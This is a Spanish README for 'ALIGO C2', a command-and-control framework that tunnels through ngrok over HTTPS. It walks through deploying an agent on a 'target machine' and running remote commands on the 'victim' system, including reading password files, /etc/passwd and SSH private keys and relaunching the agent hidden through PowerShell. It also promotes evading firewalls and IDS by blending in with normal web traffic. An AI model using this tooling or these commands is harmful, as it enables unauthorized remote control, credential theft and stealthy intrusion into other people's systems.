# 🚀 ALIGO C2 - Versión HTTPS

## ✅ Migración completada

Tu framework C2 ha sido **completamente migrado de TCP a HTTPS**:

- ✅ Servidor convertido a Flask HTTP/HTTPS
- ✅ Agente convertido a requests HTTP
- ✅ Terminal interactiva conservada (100% funcional)
- ✅ Mismos comandos, mismas capacidades
- ✅ Compatible con ngrok HTTP

---

## 🎯 Inicio rápido

### 1. Instalar dependencias

```bash
pip install -r requirements.txt
```

### 2. Iniciar servidor

```bash
cd server
./start_server.sh
# O directamente: python3 server.py
```

### 3. Exponer con ngrok

En otra terminal:

```bash
ngrok http 5000
```

Copia la URL, ejemplo: `https://abc123.ngrok-free.app`

### 4. Conectar agente

En la máquina objetivo:

```bash
python3 agent/agent_ngrok.py https://abc123.ngrok-free.app
```

### 5. Usar la consola

En el servidor:

```bash
> list
 - agent-abc123 | DESKTOP | Windows | last_seen: 14:30:45

> use agent-abc123 whoami
[enviado] id=f3a9 -> agent-abc123: whoami

[resultado de agent-abc123] (id=f3a9):
DESKTOP\Usuario

> use @agent dir C:\Users
[auto-seleccionado] agent-abc123
...
```

---

## 📚 Comandos de la consola

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `list` | Lista agentes conectados | `list` |
| `use <id> <cmd>` | Ejecuta comando en agente | `use agent-abc123 whoami` |
| `use @agent <cmd>` | Auto-selecciona único agente | `use @agent ipconfig` |
| `exit` | Cierra el servidor | `exit` |

---

## 🎯 Ejemplos de comandos reales

### Windows

```bash
# Sistema
> use agent-123 whoami
> use agent-123 hostname
> use agent-123 systeminfo

# Archivos
> use agent-123 dir C:\Users
> use agent-123 type C:\passwords.txt
> use agent-123 cd C:\temp

# Procesos
> use agent-123 tasklist
> use agent-123 wmic process where "name='python.exe'" get ProcessId,CommandLine

# PowerShell
> use agent-123 powershell Get-Process | Select-Object -First 10
> use agent-123 powershell -Command "Set-Location C:\temp; Start-Process python -ArgumentList 'agent.py','https://new-url.ngrok.io' -WindowStyle Hidden"

# Red
> use agent-123 ipconfig
> use agent-123 netstat -ano

# Matar procesos
> use agent-123 taskkill /F /PID 1234
> use agent-123 cmd /c "timeout /t 5 & taskkill /F /PID 5678"
```

### Linux

```bash
# Sistema
> use agent-456 uname -a
> use agent-456 cat /etc/passwd
> use agent-456 id

# Archivos
> use agent-456 ls -la /home
> use agent-456 cat /home/user/.ssh/id_rsa
> use agent-456 pwd

# Procesos
> use agent-456 ps aux
> use agent-456 ps aux | grep python

# Red
> use agent-456 ifconfig
> use agent-456 netstat -tulpn
```

---

## 🔧 Arquitectura

```
┌─────────────────────────────────────────────────────┐
│                   OPERADOR                          │
│  Terminal interactiva con comandos: list, use, exit │
└─────────────────┬───────────────────────────────────┘
                  │
                  ↓
┌─────────────────────────────────────────────────────┐
│              SERVIDOR (Flask)                       │
│  - Puerto 5000 (HTTP)                              │
│  - Endpoints: /checkin, /poll, /result, /health    │
│  - Cola de comandos en memoria                     │
└─────────────────┬───────────────────────────────────┘
                  │
                  ↓ (ngrok)
            [Internet]
                  ↓
┌─────────────────────────────────────────────────────┐
│              AGENTE (requests)                      │
│  - Polling cada 2 segundos                         │
│  - Ejecuta comandos con subprocess.run()           │
│  - Envía resultados                                │
└─────────────────┬───────────────────────────────────┘
                  │
                  ↓
┌─────────────────────────────────────────────────────┐
│           SISTEMA OPERATIVO VÍCTIMA                 │
│  cmd.exe / bash / powershell                       │
└─────────────────────────────────────────────────────┘
```

---

## 📊 Comparación TCP vs HTTPS

| Característica | TCP (anterior) | HTTPS (actual) |
|----------------|----------------|----------------|
| **Protocolo** | Socket TCP raw | HTTP/HTTPS |
| **Puerto servidor** | 4444 | 5000 |
| **ngrok** | `ngrok tcp 4444` | `ngrok http 5000` |
| **Inicio agente** | `python3 agent.py HOST PORT` | `python3 agent.py URL` |
| **Evasión firewall** | ⚠️ Bloqueado fácilmente | ✅ Pasa como web normal |
| **Detección IDS** | ⚠️ Tráfico sospechoso | ✅ Parece HTTPS legítimo |
| **Cifrado** | ❌ Depende de ngrok | ✅ TLS/SSL nativo |
| **Terminal interactiva** | ✅ | ✅ (idéntica) |
| **Capacidades** | ✅ Todas | ✅ Todas (iguales) |

---

## 🔒 Seguridad y evasión

### Lo que se mantiene igual:
- Ejecución de comandos con `shell=True`
- Permisos del agente (user/root)
- Capacidades de post-explotación
- Timeout de 30 segundos por comando

### Mejoras de evasión con HTTPS:
- ✅ Tráfico HTTPS normal (puerto 443)
- ✅ Difícil de distinguir de navegación web
- ✅ Pasa firewalls corporativos
- ✅ Cifrado TLS integrado

### Próximas mejoras (opcionales):
- Jitter aleatorio en polling
- User-Agent de navegador real
- Endpoints falsos (`/login`, `/api/v1`)
- Cifrado adicional del payload

---

## 🐛 Troubleshooting

### Error: "No module named 'flask'"

```bash
pip install flask requests
```

### Error: "No module named 'requests'"

En la máquina del agente:
```bash
pip install requests
```

### El agente no se conecta

1. Verifica que el servidor esté corriendo:
   ```bash
   curl http://localhost:5000/health
   ```

2. Verifica ngrok:
   ```bash
   curl https://tu-url.ngrok.io/health
   ```

3. Revisa la URL del agente (debe incluir `https://` o `http://`)

### ngrok muestra "Invalid Host Header"

Es normal con ngrok gratuito. El agente debería funcionar igual.

---

## 📁 Estructura del proyecto

```
aligo-c2-frameworkk/
├── server/
│   ├── server.py            # Servidor Flask HTTPS ✅
│   └── start_server.sh      # Script de inicio actualizado ✅
├── agent/
│   ├── agent.py             # Agente básico (local)
│   └── agent_ngrok.py       # Agente HTTPS para ngrok ✅
├── requirements.txt         # Dependencias (flask, requests) ✅
├── HTTPS_GUIDE.md          # Guía detallada de uso ✅
└── README_HTTPS.md         # Este archivo ✅
```

---

## ✅ Verificación de funcionamiento

```bash
# Terminal 1: Servidor
cd server
python3 server.py

# Terminal 2: ngrok
ngrok http 5000
# Copiar URL: https://abc123.ngrok.io

# Terminal 3: Agente
python3 agent/agent_ngrok.py https://abc123.ngrok.io

# Terminal 1 (servidor):
> list
 - agent-abc123 | ...
> use @agent whoami
[resultado] ...
```

---

## 📞 Soporte

Para más detalles, revisa:
- `HTTPS_GUIDE.md` - Guía completa de uso
- `server/server.py` - Código del servidor
- `agent/agent_ngrok.py` - Código del agente

---

## 🎓 Conceptos clave

**Polling HTTP**: El agente pregunta periódicamente si hay comandos
**Cola de comandos**: El servidor guarda comandos hasta que el agente los recoge
**Estado agnóstico**: El servidor HTTP no mantiene conexiones persistentes
**Shell=True**: Los comandos se ejecutan en el shell nativo del sistema

---

¡Tu C2 está listo para usar con HTTPS! 🚀
